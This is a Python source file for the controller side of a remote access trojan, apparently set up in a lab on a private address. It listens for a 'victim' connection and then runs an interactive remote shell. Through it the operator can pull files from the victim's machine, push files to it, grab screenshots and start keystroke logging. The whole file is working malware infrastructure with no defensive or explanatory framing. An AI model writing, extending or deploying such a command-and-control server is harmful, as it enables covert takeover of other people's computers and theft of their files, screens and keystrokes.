#!/usr/bin/python
import socket
import json
import base64
import datetime

HostIP="10.0.2.4"
HostPort=56789


def reliable_send(data):
    json_data=json.dumps(data)
    target.send(bytes(json_data,encoding="utf-8"))

def reliable_recv():
    json_data = bytearray(0)
    while True:
        try:
            json_data += target.recv(1024)
            return json.loads(json_data)
        except ValueError:
            continue



#Establish Socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

#Bind Address
s.bind((HostIP,HostPort))

#Service Start
s.listen()
print("Server START!")
target,ip=s.accept()
print("Victim connected!")

#Communicate
while True:
    command=input("* Shell#~%s: " %str(ip))
    #target.send(command.encode())
    reliable_send(command)
    if command == "q":
        break
    elif command[:2] == "cd" and len(command) >1:
        continue
    elif command[:8] == "download":  #Client to Server
        result = reliable_recv()
        if result[:4] !="[!!]":
            with open(command[9:], "wb") as file_down:
                file_down.write(base64.b64decode(result))
        else:
            print(result)
    elif command[:6] == "upload":
        try:
            with open(command[7:], "rb") as file_up:
                content = file_up.read()
                reliable_send(base64.b64encode(content).decode("ascii"))
        except:
            failed = "[!!] Fail to upload!"
            reliable_send(failed)
            print(failed)
    elif command[:10] == "screenshot":
        image = reliable_recv()
        if image[:4] != "[!!]":
            ss_file = "screen_" + str(ip) + datetime.datetime.now().strftime("_%Y-%m-%d_%H:%M:%S")
            with open(ss_file, "wb") as screen:
                screen.write(base64.b64decode(image))
        else:
            print(image)
    elif command[:12] == "keylog_start":
        continue
    else:
        # result = target.recv(1024)
        result = reliable_recv()
        print(result)



#Disconnect
s.close()
